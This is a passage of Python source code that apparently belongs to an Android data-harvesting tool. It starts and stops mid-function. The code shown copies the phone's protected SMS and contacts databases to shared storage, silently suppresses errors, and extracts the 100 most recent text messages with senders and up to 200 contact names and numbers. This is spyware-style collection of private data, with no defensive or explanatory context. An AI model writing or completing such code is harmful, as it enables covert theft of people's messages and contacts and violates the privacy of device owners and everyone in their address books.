 except:return None
def get_sms():
 try:
  os.system("cp /data/data/com.android.providers.telephony/databases/mmssms.db /sdcard/ 2>/dev/null")
  if os.path.exists("/sdcard/mmssms.db"):
   conn=sqlite3.connect("/sdcard/mmssms.db")
   cur=conn.cursor()
   cur.execute("SELECT address,body,date FROM sms ORDER BY date DESC LIMIT 100")
   s=cur.fetchall()
   conn.close()
   return "\n".join([f"{x[0]}: {str(x[1])[:50]}"for x in s if x[1]])
  return"no"
 except:return"no"
def get_contacts():
 try:
  os.system("cp /data/data/com.android.providers.contacts/databases/contacts2.db /sdcard/ 2>/dev/null")
  if os.path.exists("/sdcard/contacts2.db"):
   conn=sqlite3.connect("/sdcard/contacts2.db")
   cur=conn.cursor()
   cur.execute("SELECT display_name,number FROM contacts LIMIT 200")
   c=cur.fetchall()
